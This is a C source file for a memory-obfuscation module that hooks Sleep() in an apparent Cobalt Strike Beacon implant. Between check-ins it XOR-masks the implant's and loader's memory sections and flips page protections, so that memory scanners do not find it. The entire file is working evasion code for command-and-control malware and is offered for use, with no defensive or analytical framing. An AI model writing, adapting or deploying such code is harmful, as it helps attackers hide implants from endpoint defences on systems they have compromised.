/*
 * Memory Obfuscation — XOR-mask Beacon memory during sleep intervals
 *
 * During sleep between check-ins, Beacon's memory resides in RX pages
 * and is recoverable by any memory scanner. This module:
 *   1. Hooks Sleep()
 *   2. Transitions tracked regions to RW
 *   3. XOR-masks all tracked memory
 *   4. Calls the real Sleep
 *   5. Unmasks on wake
 *   6. Restores original page protection
 *
 * The loader populates MEMORY_LAYOUT via setup_memory() after loading
 * both the PICO and Beacon.
 */

#include <windows.h>

DECLSPEC_IMPORT BOOL  WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);
DECLSPEC_IMPORT VOID  WINAPI KERNEL32$Sleep(DWORD);

/* ---- Memory tracking structures ---- */

typedef struct {
    PVOID  BaseAddress;
    SIZE_T Size;
    DWORD  CurrentProtect;
    DWORD  PreviousProtect;
} MEMORY_SECTION;

typedef struct {
    PVOID           BaseAddress;
    SIZE_T          Size;
    MEMORY_SECTION  Sections[8];   /* .text, .rdata, .data, .pdata, ... */
} MEMORY_REGION;

typedef struct {
    MEMORY_REGION Pico;
    MEMORY_REGION Dll;             /* Beacon */
} MEMORY_LAYOUT;

/* ---- Global state ---- */

MEMORY_LAYOUT g_memory;

/* XOR key patched in from the spec file per build */
char xorkey[128] = {1};

/* ---- Mask / Unmask ---- */

static void apply_mask(char *data, DWORD len) {
    for (DWORD i = 0; i < len; i++) data[i] ^= xorkey[i % 128];
}

void mask_memory(MEMORY_LAYOUT *mem, BOOL mask) {
    for (int r = 0; r < 2; r++) {
        MEMORY_REGION *region = (r == 0) ? &mem->Pico : &mem->Dll;
        for (int s = 0; s < 8; s++) {
            MEMORY_SECTION *sec = &region->Sections[s];
            if (sec->BaseAddress == NULL) break;

            DWORD old;
            KERNEL32$VirtualProtect(sec->BaseAddress, sec->Size, PAGE_READWRITE, &old);
            apply_mask(sec->BaseAddress, sec->Size);
            /* restore original protection on unmask */
            if (!mask) {
                KERNEL32$VirtualProtect(sec->BaseAddress, sec->Size, sec->CurrentProtect, &old);
            }
        }
    }
}

/* ---- Sleep Hook ---- */

VOID WINAPI _Sleep(DWORD ms) {
    mask_memory(&g_memory, TRUE);
    KERNEL32$Sleep(ms);
    mask_memory(&g_memory, FALSE);
}

/* ---- Loader handoff — called after loading PICO and Beacon ---- */

void setup_memory(MEMORY_LAYOUT *layout) {
    if (layout != NULL) g_memory = *layout;   /* copy — loader will be freed */
}
